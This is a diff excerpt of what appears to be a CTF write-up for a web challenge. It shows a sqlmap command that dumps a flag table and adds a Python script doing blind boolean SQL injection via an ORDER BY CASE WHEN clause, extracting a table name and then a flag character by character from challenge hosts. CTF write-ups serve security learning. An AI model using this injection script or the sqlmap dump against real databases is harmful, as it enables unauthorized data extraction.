@@ -104,8 +104,43 @@ it has to be something very obvious, like it's order by followed by coloumn name
 
 `sqlmap -u "http://40.69.84.14/profiles?order=first_name" -T flag --dump`
 
-Gives the flag. Intended solution is probably doing case with a boolean expression to brute the flag. 
+Gives the flag. Intended solution is probably doing case with a boolean expression to brute the flag. Too lazy to actually try and solve it with the intended solution so 
+I'll post my solve script for a similar challenge from another CTF: 
 
+```import requests
+import string
+
+
+HOST = "http://46.101.44.190:30546"
+
+flagname = 'flag_'
+for i in range(0,10):
+    for char in range(0,16):
+        response = requests.post( HOST + '/api/list', data={"order": "(CASE WHEN (SELECT name FROM sqlite_master where name like '{0}{1}%') is null then name else count end) DESC".format(flagname, hex(char)[2:] )})
+        if response.json()[0]["id"] != 4:
+            flagname += str(hex(char)[2:])
+            print(flagname)
+            break
+
+
+
+
+lastChar = ''
+flag = ''
+
+sqlSafe = """0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&()*+, -./:;<=>?@[\]^_`{|}~ """
+
+while lastChar != '}' : 
+    for char in sqlSafe:
+        response = requests.post( HOST + '/api/list', data={"order": "(CASE WHEN (SELECT substr(flag,{0},1) FROM {1}) IS '{2}' THEN NAME else COUNT end ) DESC".format(len(flag) +1, flagname, char )})
+        if response.json()[0]["id"] == 4:
+            flag += char
+            lastChar = char
+            print(flag)
+            break
+```
+
+Where I basically used the fact that you can do case when after order to brute the flag table name first and the flag itself character by character. 
 
 ## Android
 
